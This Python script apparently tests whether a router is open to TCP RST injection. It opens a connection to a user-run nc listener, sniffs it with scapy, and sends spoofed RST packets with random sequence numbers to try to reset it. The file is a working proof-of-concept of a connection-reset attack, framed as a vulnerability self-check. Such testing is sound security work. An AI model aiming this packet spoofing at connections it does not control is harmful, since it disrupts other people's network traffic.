from datetime import datetime
import socket
import time
from scapy.all import sniff, send, TCP, IP
from threading import Thread
from queue import SimpleQueue
import numpy as np
import netifaces
import argparse

def get_ip_address(interface):
    try:
        # Get the addresses associated with the interface
        addresses = netifaces.ifaddresses(interface)
        
        # Get the IPv4 address
        ipv4_info = addresses[netifaces.AF_INET][0]
        ipv4_address = ipv4_info['addr']
        
        return ipv4_address
    except KeyError:
        print(f"Interface {interface} does not have an IPv4 address.")
        return None
    except ValueError:
        print(f"Interface {interface} not found.")
        return None

que = SimpleQueue()

class VictimConnection:

    def __init__(self, server_addr, server_port, src_port):
        """
        Establish a TCP connection to the server with source_port
        Store the socket in self.conn
        """
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Bind the socket to the source port
        if src_port:
            self.conn.bind(('', src_port))
        
        # Connect to the server
        print(f"Connecting to {server_addr} with port {server_port}")
        self.conn.connect((server_addr, server_port))
        self.victim_port = self.conn.getsockname()[1]
        print(f"Connected! source port {self.victim_port}")

    def send(self, msg: str):
        try:
            self.conn.sendall(msg.encode())
        except Exception as e:
            print(f"Error sending message: {e}")




def packet_callback(packet):
    if IP in packet and TCP in packet:
        # ip_layer = packet[IP]
        tcp_layer = packet[TCP]
        seq_num = tcp_layer.seq
        ack_num = tcp_layer.ack
        window = tcp_layer.window
        seq_end = seq_num + len(tcp_layer.payload)
        que.put({
            "seq": seq_end,
            "ack": ack_num,
            "window": window,
        })

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Check whether the router has this vulnerability on a single machine",
                                     add_help=True)
    parser.add_argument("--server-addr", type=str, help="Server address. Please setup a nc listening on the server.")
    parser.add_argument("--server-port", type=int, help="Server nc port. Please setup a nc listening on the server.")
    parser.add_argument("--victim-port", type=int, help="(Optional) client port to bind to.")
    parser.add_argument("--count", type=int, default=10, help="Number of TCP RST packets to send.")
    parser.add_argument("--timeout", type=float, default=10., help="Timeout (in seconds) to wait after sending TCP RST.")
    parser.add_argument("--interface", type=str, help="Interface to get ip.")
    args = parser.parse_args()

    server_addr = args.server_addr or input("Enter the server address: ")
    server_port = args.server_port or int(input("Enter the server port: "))
    interface = args.interface or input("Enter the interface to get ip (enter nothing to use 127.0.0.1): ")
    if interface:
        victim_addr = get_ip_address(interface)
    else:
        victim_addr = "127.0.0.1"
    victim = VictimConnection(server_addr, server_port, args.victim_port)
    victim_port = victim.victim_port
    victim.send(f"Hello from client at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    Thread(target=sniff, kwargs={
        "filter": f"dst host {server_addr} and src port {victim_port}",
        "prn": packet_callback
    }).start()

    last_seq = 0
    last_ack = 0
    last_win = 0
    while not que.empty():
        t = que.get()
        last_seq = t['seq']
        if t['ack']:
            last_ack = t['ack']
        last_win = t['window']
    for _ in range(args.count):
        seq = np.random.randint(1 << 32)
        send(IP(src=victim_addr, dst=server_addr) /
             TCP(sport=victim_port,
                 dport=server_port,
                 flags='R',
                 seq=seq,
                 window=last_win)
             )
    print(f"Sent {args.count} packets with random seq numbers.")
    time.sleep(args.timeout)
    print(f"Sending new packet...")
    victim.send(f"""Hello from client again at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}.\n"""
                f"""If the server receives this message, the exploit failed.""")





